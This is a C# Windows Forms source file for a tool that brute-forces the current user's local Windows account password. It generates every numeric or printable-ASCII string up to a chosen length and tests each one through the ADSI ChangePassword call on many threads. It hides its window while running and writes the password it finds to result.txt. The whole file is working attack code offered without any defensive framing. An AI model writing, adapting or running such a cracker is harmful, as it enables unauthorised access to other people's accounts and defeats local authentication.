using System;
using System.Windows.Forms;
using System.DirectoryServices;
using System.IO;
using System.Runtime.Remoting.Messaging;
using System.Threading.Tasks;
using System.Threading;
namespace GET
{
    public partial class Form1 : Form
    {
        public int from;
        public int to;
        public TaskFactory tf;
        public int NumofBit;
        public char[] password;
        public DirectoryEntry user = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer").Children.Find(Environment.UserName, "user");
        public void GetPassword(int time)
        {
            for (int i =from ; i < to; i++)
            {
                password[time] = (char)i;
                if (time < NumofBit)
                {
                    GetPassword(time + 1);
                }
                else
                {
                    string p = new string(password);
                    tf.StartNew(TryPassword, p);                                 
                }
            }
        }
        public void TryPassword(object p)
        {
            object[] pa = { p, p };
            try
            {
                user.Invoke("ChangePassword", pa);
            }
            catch
            {
                return;
            }
            StreamWriter f = new StreamWriter(Application.StartupPath + "/result.txt");
            f.Write(p);
            f.Close();
            Application.Exit();
        }

        public Form1()
        {
            InitializeComponent();
            ThreadPool.SetMaxThreads(32000, Environment.ProcessorCount);
            tf = new TaskFactory();
        }

        private void Patch_Click(object sender, EventArgs e)
        {
            from = OnlyNumber.Checked ? 48 : 32;
            to = OnlyNumber.Checked ? 58 : 127;
            Hide();
            password = new char[(int)Bits.Value];
            NumofBit = (int)Bits.Value - 1;
            GetPassword(0);
        }
    }
}
